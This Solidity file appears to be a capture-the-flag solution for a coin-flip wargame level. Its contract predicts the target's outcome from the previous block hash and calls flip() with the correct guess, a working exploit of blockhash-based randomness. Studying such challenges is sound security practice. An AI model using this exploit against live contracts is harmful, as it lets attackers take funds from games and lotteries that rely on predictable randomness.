// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

interface Coinflip {
     function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
  
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;



    function hack(address _instanceAddr) public {
           Coinflip coinflip =  Coinflip(_instanceAddr);
         uint256 blockValue = uint256(blockhash(block.number -1 ));
         uint256 coinFlip = blockValue/ FACTOR;
         side = coinFlip == 1 ? true : false;
         coinflip.flip(side);
    }
}